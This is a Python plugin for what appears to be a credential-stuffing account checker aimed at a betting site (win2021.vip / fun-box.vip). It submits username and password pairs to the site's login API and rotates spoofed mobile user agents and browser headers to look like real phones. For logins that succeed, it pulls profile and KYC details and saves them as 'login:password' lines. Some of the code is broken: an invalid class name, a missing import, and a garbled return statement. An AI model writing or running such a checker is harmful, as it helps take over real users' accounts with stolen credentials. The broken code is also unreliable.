from core.base_checker import BaseChecker
from typing import Dict, Any
import requests

class Fun-Box.VipChecker(BaseChecker):
    """Template for creating new site checkers"""
    
    # Configuration for this site
    LOGIN_URL = "https://www.win2021.vip/api/user/h5login"
    PROFILE_URL = "https://www.win2021.vip/api/user/get_user_info"
    WALLET_URL = "https://example.com/api/wallet"
    USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Mi A2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.64 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-J600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.80 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.95 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.122 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.99 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A305F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6589.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A405F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6645.90 Mobile Safari/537.36",

    "Mozilla/5.0 (Linux; Android 11; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6699.101 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6745.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6790.123 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi Note 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6841.98 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Redmi 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6895.110 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; POCO X3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.6947.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Nokia 5.4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7002.131 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Moto G Power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.7058.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Moto G Stylus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7109.151 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; OnePlus Nord) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7165.160 Mobile Safari/537.36",

    "Mozilla/5.0 (Linux; Android 12; Pixel 3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.250 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.199 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.170 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.190 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.201 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.6533.215 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Galaxy S21 FE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6589.199 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Galaxy A52) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6645.178 Mobile Safari/537.36",

    "Mozilla/5.0 (Linux; Android 13; Pixel 6a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6699.140 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6745.150 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.6790.160 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.6841.170 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S916B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.6895.180 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.6947.190 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Galaxy A54) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.7002.200 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Galaxy A34) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.7058.210 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Redmi Note 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.7109.220 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7165.230 Mobile Safari/537.36",
]
    
    chrome_ver = random.randint(137, 139)
    HEADERS =  {
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json",
        "sec-ch-ua": f'"Chromium";v="{chrome_ver}", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "origin": "https://www.fun-box.vip",
        "referer": "https://www.fun-box.vip/",
        "accept-language": random.choice([
            "en-US,en;q=0.9",
            "en-GB,en;q=0.8",
            "fr-FR,fr;q=0.9,en;q=0.5"
        ]),
    }
    
    def check_account(self, username: str, password: str) -> Dict[str, Any]:
        """Check single account for this site"""
        try:
            # Login request
            payload = {
                "username": username,
                "password": password
            }
            
            response = self.session.post(
                self.LOGIN_URL,
                json=payload,
                headers=self.HEADERS,
                timeout=30
            )
            
            if response.status_code != 200:
                return {"status": "bad", "username": username}
            
            data = response.json()
            
            if not data.get("success", False):
                return {"status": "bad", "username": username}
            
            # Get profile info
            profile_response = self.session.get(
                self.PROFILE_URL,
                headers=self.HEADERS,
                timeout=30
            )
            
            profile = profile_response.json() if profile_response.status_code == 200 else {}
            
            # Your custom logic here
            account_data = {
                "login": username,
                "password": password,
                "balance": 0,
                "kyc_status": profile.get("kyc", False),
                # Add more fields as needed
            }
            
            return {
                "status": "valid",
                "account_data": account_data,
                "should_save": self.should_save(account_data)
            }
            
        except Exception as e:
            return {"status": "error", "username": username, "error": str(e)}
    
    def should_save(self, account_data: Dict[str, Any]) -> bool:
        """Define conditions for saving account"""
        # Example: Save if KYC verified and has balance
        return "User-Agent": "Mozilla/5.0 (Linux; Android 13; POCO F5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.7165.230 Mobile Safari/537.36",
    
    def save_format(self, account_data: Dict[str, Any]) -> str:
        """Format account data for saving to file"""
        return f"{account_data['login']}:{account_data['password']} | " \
               f"balance={account_data.get('balance', 0)} | " \
               f"kyc={account_data.get('kyc_status', False)}\n"